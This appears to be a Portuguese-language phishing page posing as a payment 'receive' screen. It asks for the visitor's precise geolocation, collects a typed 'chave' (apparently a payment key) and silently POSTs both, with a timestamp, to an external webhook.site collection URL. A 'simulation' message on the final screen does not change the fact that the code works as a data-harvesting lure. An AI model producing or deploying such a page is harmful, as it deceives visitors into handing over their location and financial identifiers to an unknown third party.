<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Recebimento</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
  margin:0;
  font-family: Arial, sans-serif;
  background:#f4f4f4;
}
.tela{
  display:none;
  height:100vh;
  justify-content:center;
  align-items:center;
  flex-direction:column;
}
.tela.ativa{ display:flex; }

button{
  background:#7a2cff;
  color:#fff;
  border:none;
  padding:16px 30px;
  border-radius:12px;
  font-size:18px;
}

input{
  padding:14px;
  width:80%;
  max-width:300px;
  border-radius:10px;
  border:1px solid #ccc;
  margin-bottom:20px;
  font-size:16px;
}

/* Notificação fake */
#notif{
  position:fixed;
  top:-100px;
  left:50%;
  transform:translateX(-50%);
  background:#2d2d2d;
  color:#fff;
  padding:15px 20px;
  border-radius:12px;
  transition:top .5s;
  z-index:999;
  font-size:14px;
}
#notif.show{ top:20px; }
</style>
</head>

<body>

<div id="notif"></div>

<!-- TELA 1 -->
<div id="t1" class="tela ativa">
  <button onclick="pedirPermissoes()">Receber</button>
</div>

<!-- TELA 2 -->
<div id="t2" class="tela">
  <input id="chave" placeholder="Digite sua chave">
  <button onclick="confirmar()">Confirmar</button>
</div>

<!-- TELA 3 -->
<div id="t3" class="tela">
  <h3>Simulação concluída</h3>
  <p>Isso é apenas uma demonstração.</p>
</div>

<script>
let posicao = null;

function pedirPermissoes(){
  if(Notification.permission !== "granted"){
    Notification.requestPermission();
  }

  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(
      p => {
        posicao = p;
        trocarTela("t2");
      },
      () => alert("Permita a localização para continuar")
    );
  }else{
    alert("Geolocalização não suportada");
  }
}

async function confirmar(){
  if(!posicao){
    alert("Localização não obtida");
    return;
  }

  const dados = {
    chave: document.getElementById("chave").value || "vazio",
    latitude: posicao.coords.latitude,
    longitude: posicao.coords.longitude,
    precisao: posicao.coords.accuracy,
    data: new Date().toISOString()
  };

  try{
    await fetch("https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6", {
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body: JSON.stringify(dados),
      keepalive:true
    });
  }catch(e){}

  mostrarNotif();
  trocarTela("t3");
}

function mostrarNotif(){
  const n = document.getElementById("notif");
  n.innerHTML = "<b>Simulação</b><br>Recebimento demonstrativo concluído";
  n.classList.add("show");
  setTimeout(()=>n.classList.remove("show"),4000);
}

function trocarTela(id){
  document.querySelectorAll(".tela").forEach(t=>t.classList.remove("ativa"));
  document.getElementById(id).classList.add("ativa");
}
</script>

</body>
</html>
